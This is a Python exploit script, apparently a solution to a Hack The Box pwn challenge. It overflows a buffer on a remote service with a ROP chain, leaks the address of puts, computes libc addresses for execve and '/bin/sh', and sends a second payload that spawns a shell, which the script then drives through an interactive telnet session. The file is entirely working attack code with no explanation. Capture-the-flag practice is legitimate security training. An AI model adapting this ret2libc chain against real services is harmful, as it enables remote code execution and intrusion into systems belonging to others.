import socket
import struct
import telnetlib

HOST = "docker.hackthebox.eu"
PORT = 43053
#HOST = "127.0.0.1"
#PORT = 4444

scl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
scl.connect((HOST, PORT))

print(scl.recv(1024).decode('latin-1'))

payload = b'a'*0x48+b'\xd3\x06\x40\x00\x00\x00\x00\x00\x18\x10\x60\x00\x00\x00\x00\x00\xe0\x04\x40\x00\x00\x00\x00\x00\x26\x06\x40\x00\x00\x00\x00\x00'+b'\n'
#payload = b'a'*0x48 + b'\x26\x06\x40\x00\x00\x00\x00\x00'*8

scl.sendall(payload)
print("[*] Sending first payload...")

msg = scl.recv(1024)[:6]

address_puts = int.from_bytes(msg,byteorder="little") & 0xffffffffffff
print("[*] Address of puts : "+str(hex(address_puts)))

address_execve = (address_puts + 0x5d0e0)
address_binsh = (address_puts + 0x11d6c7) - 0x40

print("[*] Address of execve : "+hex(address_execve))
print("[*] Address of binsh : "+hex(address_binsh))

payload = b'a'*0x48+ b'\xd3\x06\x40\x00\x00\x00\x00\x00' + struct.pack(">Q",address_binsh)[::-1] + b'\xd1\x06\x40\x00\x00\x00\x00\x00' + b'\x00'*16 +struct.pack(">Q",address_execve)[::-1] + b'\n'
#payload = b'a'*0x48+ b'\xd3\x06\x40\x00\x00\x00\x00\x00' + struct.pack(">Q",address_binsh)[::-1] + b'\xe0\x04\x40\x00\x00\x00\x00\x00\x26\x06\x40\x00\x00\x00\x00\x00' +b'\n'

#print("Payload : "+str(payload))

scl.sendall(payload)
print("[*] Exploit Successful!")

t = telnetlib.Telnet()
t.sock = scl
t.interact()

scl.close()
